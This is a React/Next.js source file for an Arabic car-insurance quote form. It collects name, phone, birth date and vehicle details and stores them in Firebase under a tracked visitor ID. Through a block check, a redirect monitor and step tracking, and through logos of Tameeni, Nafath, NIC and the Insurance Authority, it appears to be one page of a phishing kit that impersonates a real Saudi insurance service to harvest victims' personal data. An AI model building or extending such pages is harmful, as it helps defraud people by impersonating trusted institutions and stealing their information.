"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { Input } from "@/components/ui/input";
import {
  User,
  Phone,
  Calendar,
  Car,
  Tag,
  Wrench,
  Settings2,
  Search,
  Loader2,
} from "lucide-react";
import { FullPageLoader } from "@/components/loader";
import { StepShell } from "@/components/step-shell";
import { getOrCreateVisitorID, checkIfBlocked } from "@/lib/visitor-tracking";
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
import { addData } from "@/lib/firebase";
import { getSelectedVehicle } from "@/lib/vehicle-api";


const FIELD_CLASS =
  "w-full h-12 text-right text-sm border border-gray-200 rounded-xl px-4 bg-white focus:border-[#1976d2] focus:outline-none transition-all text-gray-800 font-medium";

function FieldLabel({
  icon,
  children,
}: {
  icon: React.ReactNode;
  children: React.ReactNode;
}) {
  return (
    <label
      className="flex items-center gap-2 text-sm font-bold text-gray-700 mb-1.5 w-full"
      dir="rtl"
    >
      {children}
    </label>
  );
}

export default function InsurancePage() {
  const router = useRouter();
  const [visitorID] = useState(() => getOrCreateVisitorID());
  const [loading, setLoading] = useState(true);
  const [isBlocked, setIsBlocked] = useState(false);
  const [submitting, setSubmitting] = useState(false);

  // Form fields
  const [fullName, setFullName] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [birthDate, setBirthDate] = useState("");
  const [insuranceCoverage, setInsuranceCoverage] = useState("comprehensive");
  const [insuranceStartDate, setInsuranceStartDate] = useState("");
  const [vehicleUsage, setVehicleUsage] = useState("");
  const [vehicleValue, setVehicleValue] = useState("");
  const [vehicleYear, setVehicleYear] = useState("");
  const [vehicleModel, setVehicleModel] = useState("");
  const [repairLocation, setRepairLocation] = useState("agency");

  useEffect(() => {
    // Pre-fill start date with today
    const today = new Date().toISOString().split("T")[0];
    setInsuranceStartDate(today);
    // Pre-fill name/phone from home step
    try {
      const hfd = JSON.parse(localStorage.getItem("homeFormData") || "{}");
      if (hfd.ownerName) setFullName(hfd.ownerName);
      if (hfd.phoneNumber) setPhoneNumber(hfd.phoneNumber);
    } catch {
      /* ignore */
    }
  }, []);

  useRedirectMonitor({ visitorId: visitorID, currentPage: "insur" });

  useEffect(() => {
    const init = async () => {
      const blocked = await checkIfBlocked(visitorID);
      if (blocked) {
        setIsBlocked(true);
        setLoading(false);
        return;
      }
      setLoading(false);
    };
    init();
  }, [visitorID]);

  useEffect(() => {
    const vehicleData = getSelectedVehicle();
    if (vehicleData) {
      setVehicleYear(vehicleData.year.toString());
      setVehicleModel(`${vehicleData.maker} ${vehicleData.model}`);
    }
  }, []);

  const handleVehicleValueChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setVehicleValue(e.target.value.replace(/[^0-9]/g, ""));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const valueNum = parseInt(vehicleValue);
    if (valueNum < 10000 || valueNum > 1000000) {
      alert("قيمة المركبة يجب أن تكون بين 10,000 و 1,000,000 ريال");
      return;
    }
    setSubmitting(true);
    const insurData = {
      fullName,
      ownerName: fullName,
      phoneNumber,
      birthDate,
      insuranceCoverage,
      insuranceStartDate,
      vehicleUsage,
      vehicleValue,
      vehicleYear,
      vehicleModel,
      repairLocation,
      timestamp: new Date().toISOString(),
    };
    localStorage.setItem("insurFormData", JSON.stringify(insurData));
    await addData({
      id: visitorID,
      ...insurData,
      currentStep: 3,
      currentPage: "compar",
      insurCompletedAt: new Date().toISOString(),
    });
    router.push("/compar");
  };

  if (loading) return <FullPageLoader />;

  if (isBlocked) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <div className="text-center p-8 bg-white rounded-lg shadow-lg max-w-md">
          <h1 className="text-2xl font-bold text-red-600 mb-4">
            تم حظر الوصول
          </h1>
          <p className="text-gray-600">عذراً، تم حظر وصولك إلى هذه الخدمة.</p>
        </div>
      </div>
    );
  }

  const years = Array.from({ length: 27 }, (_, i) => 2026 - i);

  return (
    <StepShell
      step={2}
      title="بيانات التأمين"
      icon={<User className="w-5 h-5" />}
      maxWidthClassName="max-w-md"
    >
      <form onSubmit={handleSubmit} className="space-y-4" dir="rtl">
        {/* Full name */}
        <div>
          <FieldLabel icon={<User className="w-4 h-4" />}>
            الاسم الكامل
          </FieldLabel>
          <Input
            placeholder="أدخل الاسم الكامل"
            value={fullName}
            onChange={(e) => setFullName(e.target.value)}
            maxLength={50}
            className={FIELD_CLASS}
            dir="rtl"
            required
          />
        </div>

        {/* Phone */}
        <div>
          <FieldLabel icon={<Phone className="w-4 h-4" />}>
            رقم الهاتف
          </FieldLabel>
          <Input
            type="tel"
            inputMode="numeric"
            placeholder="05XXXXXXXX"
            value={phoneNumber}
            onChange={(e) =>
              setPhoneNumber(e.target.value.replace(/\D/g, "").slice(0, 10))
            }
            className={FIELD_CLASS}
            dir="ltr"
            required
          />
        </div>

        {/* Birth date */}
        <div>
          <FieldLabel icon={<Calendar className="w-4 h-4" />}>
            تاريخ الميلاد
          </FieldLabel>
          <input
            type="date"
            value={birthDate}
            onChange={(e) => setBirthDate(e.target.value)}
            className={FIELD_CLASS}
            style={{ colorScheme: "light" }}
          />
        </div>

        {/* Policy start date */}
        <div>
          <FieldLabel icon={<Calendar className="w-4 h-4" />}>
            تاريخ بدء الوثيقة
          </FieldLabel>
          <input
            type="date"
            value={insuranceStartDate}
            onChange={(e) => setInsuranceStartDate(e.target.value)}
            className={FIELD_CLASS}
            style={{ colorScheme: "light" }}
            required
          />
        </div>

        {/* Vehicle usage */}
        <div>
          <FieldLabel icon={<Car className="w-4 h-4" />}>
            الغرض من استخدام المركبة
          </FieldLabel>
          <select
            value={vehicleUsage}
            onChange={(e) => setVehicleUsage(e.target.value)}
            className={`${FIELD_CLASS} appearance-none cursor-pointer`}
            required
          >
            <option value="">اختر</option>
            <option value="personal">شخصي</option>
            <option value="commercial">تجاري</option>
            <option value="passenger-transport">نقل ركاب</option>
            <option value="rental">تأجير</option>
            <option value="cargo-transport">نقل بضائع</option>
            <option value="freight-vehicle">مركبة شحن</option>
            <option value="oil-transport">نقل مشتقات نفطية</option>
          </select>
        </div>

        {/* Vehicle value */}
        <div>
          <FieldLabel icon={<Tag className="w-4 h-4" />}>
            القيمة التقديرية للمركبة
          </FieldLabel>
          <Input
            type="tel"
            inputMode="numeric"
            placeholder="أدخل القيمة التقديرية"
            value={vehicleValue}
            onChange={handleVehicleValueChange}
            className={FIELD_CLASS}
            dir="rtl"
            required
          />
          {vehicleValue &&
            (parseInt(vehicleValue) < 10000 ||
              parseInt(vehicleValue) > 1000000) && (
              <p className="text-xs text-red-500 mt-1 text-right">
                القيمة يجب أن تكون بين 10,000 و 1,000,000 ريال
              </p>
            )}
        </div>

        {/* Vehicle year */}
        <div>
          <FieldLabel icon={<Wrench className="w-4 h-4" />}>
            سنة الصنع
          </FieldLabel>
          <select
            value={vehicleYear}
            onChange={(e) => setVehicleYear(e.target.value)}
            className={`${FIELD_CLASS} appearance-none cursor-pointer`}
            required
          >
            <option value="">اختر</option>
            {years.map((year) => (
              <option key={year} value={year}>
                {year}
              </option>
            ))}
          </select>
        </div>

        {/* Repair location — pill buttons */}
        <div>
          <FieldLabel icon={<Settings2 className="w-4 h-4" />}>
            مكان الإصلاح
          </FieldLabel>
          <div className="grid grid-cols-2 gap-2">
            {[
              { value: "workshop", label: "الورشة", icon: "🔧" },
              { value: "agency", label: "الوكالة", icon: "🏢" },
            ].map(({ value, label, icon }) => (
              <button
                key={value}
                type="button"
                onClick={() => setRepairLocation(value)}
                className={`h-12 rounded-xl text-sm font-bold border-2 transition-all flex items-center justify-center gap-2 ${
                  repairLocation === value
                    ? "border-[#1976d2] bg-[#1976d2] text-white"
                    : "border-gray-200 text-gray-600 bg-white hover:border-[#1976d2]/50"
                }`}
              >
                <span>{icon}</span>
                {label}
              </button>
            ))}
          </div>
        </div>


        {/* Submit */}
        <button
          type="submit"
          disabled={submitting}
          className="w-full h-13 py-3.5 rounded-xl bg-[#1976d2] hover:bg-[#1565c0] text-white font-bold text-base transition-all disabled:opacity-70 flex items-center justify-center gap-2"
        >
          {submitting ? (
            <Loader2 className="w-5 h-5 animate-spin" />
          ) : (
            <Search className="w-5 h-5" />
          )}
          إظهار العروض
        </button>

        {/* Disclaimer */}
        <p className="text-[11px] text-gray-500 leading-relaxed text-right">
          بالضغط على «إظهار العروض» فأنت توافق على منح شركة تأميني الحق في
          الاستعلام من وزارة التجارة و/أو مركز المعلومات الوطني عن بياناتي
        </p>
      </form>

      {/* Partner logos */}
      <div className="mt-5 pt-4 border-t border-gray-100">
        <div className="flex items-center justify-center gap-4 flex-wrap">
          <img
            src="/tameeni-logo.webp"
            alt="تأميني"
            className="h-7 w-7 rounded-lg opacity-70"
          />
          <img
            src="/NIC-logo.png"
            alt="NIC"
            className="h-6 object-contain opacity-60"
          />
          <img
            src="/nafad-logo-new.png"
            alt="نافذ"
            className="h-6 object-contain opacity-60"
          />
          <div className="flex items-center gap-1">
            <span className="text-[10px] font-bold text-gray-400">IA</span>
            <span className="text-[10px] text-gray-400">
              Insurance Authority
            </span>
          </div>
        </div>
      </div>
    </StepShell>
  );
}
